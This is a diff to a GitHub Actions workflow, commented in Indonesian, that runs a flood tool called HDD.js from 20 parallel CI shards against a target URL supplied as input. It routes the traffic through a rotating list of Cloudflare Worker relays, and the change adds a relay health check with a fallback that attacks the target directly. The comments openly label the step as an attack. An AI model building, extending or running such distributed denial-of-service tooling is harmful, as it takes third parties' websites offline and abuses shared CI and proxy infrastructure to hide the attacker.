@@ -28,27 +28,21 @@ jobs:
       matrix:
         shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
-      # 1. Ambil file dari repo (termasuk HDD.js dan proxy.txt)
       - uses: actions/checkout@v4
       
-      # 2. Setup Node.js
       - uses: actions/setup-node@v4
         with:
           node-version: '20'
           
-      # 3. Install dependensi (wajib karena node_modules tidak ada di repo)
       - name: Install npm dependencies
         run: npm install hpack axios http2-wrapper
       
-      # 4. Beri izin eksekusi pada script (kalau belum)
       - name: Make script executable
         run: chmod +x HDD.js
       
-      # 5. Pilih Worker Cloudflare secara acak
       - name: Prepare Worker List
         id: worker_sel
         run: |
-          # Daftar 11 worker
           WORKERS=(
             "https://noisy-pine-708c.kikkk8022.workers.dev/?url="
             "https://super-rice-2b3b.kikkk8022.workers.dev/?url="
@@ -62,22 +56,47 @@ jobs:
             "https://blue-frog-0993.kikkk8022.workers.dev/?url="
             "https://wispy-math-b156.kikkk8022.workers.dev/?url="
           )
-          # Pilih acak berdasarkan shard + timestamp
           SHARD_INDEX=${{ matrix.shard }}
           RANDOM_INDEX=$(( (SHARD_INDEX + $(date +%s)) % 11 ))
           SELECTED_WORKER=${WORKERS[$RANDOM_INDEX]}
           echo "selected_worker=$SELECTED_WORKER" >> $GITHUB_OUTPUT
           echo "Worker selected: $SELECTED_WORKER"
       
-      # 6. Jalankan serangan
-      - name: Run HDD.js with parameters
+      # ------- LANGKAH TEST WORKER -------
+      - name: Test Worker
+        id: test_worker
         run: |
-          # Gabungkan URL dengan worker
           WORKER_URL="${{ steps.worker_sel.outputs.selected_worker }}"
           TARGET_URL="${{ inputs.url }}"
           FULL_URL="${WORKER_URL}${TARGET_URL}"
+          echo "Testing worker: $FULL_URL"
+          # Coba akses worker dengan timeout 5 detik, simpan status HTTP
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$FULL_URL")
+          echo "Worker HTTP status: $STATUS"
+          # Anggap sukses jika status 200, 301, atau 302
+          if [[ "$STATUS" == "200" || "$STATUS" == "301" || "$STATUS" == "302" ]]; then
+            echo "Worker OK"
+            echo "worker_ok=true" >> $GITHUB_OUTPUT
+          else
+            echo "Worker FAILED (status $STATUS), akan bypass worker"
+            echo "worker_ok=false" >> $GITHUB_OUTPUT
+          fi
+      
+      # ------- JALANKAN SERANGAN -------
+      - name: Run HDD.js with parameters
+        run: |
+          WORKER_URL="${{ steps.worker_sel.outputs.selected_worker }}"
+          TARGET_URL="${{ inputs.url }}"
+          WORKER_OK="${{ steps.test_worker.outputs.worker_ok }}"
           
-          # Jalankan HDD.js
+          if [ "$WORKER_OK" == "true" ]; then
+            FULL_URL="${WORKER_URL}${TARGET_URL}"
+            echo "Menggunakan Worker: $FULL_URL"
+          else
+            FULL_URL="$TARGET_URL"
+            echo "Worker gagal, langsung ke target: $FULL_URL"
+          fi
+          
           node HDD.js \
             GET \
             "$FULL_URL" \
